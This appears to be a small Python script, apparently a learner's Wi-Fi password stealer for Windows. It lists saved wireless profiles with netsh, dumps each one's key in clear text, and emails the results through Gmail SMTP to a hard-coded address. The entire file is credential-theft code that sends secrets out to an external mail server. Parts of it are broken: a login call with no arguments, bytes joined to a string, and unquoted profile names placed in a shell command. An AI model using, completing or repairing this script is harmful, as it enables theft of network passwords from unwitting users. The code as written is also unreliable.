#!/usr/bin/env  python

import subprocess
import  smtplib
import  re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login()
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True).decode('latin1')
network_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result


send_mail("sadulloqurbonov33@gmail.com", "parol kiritiladi", result)
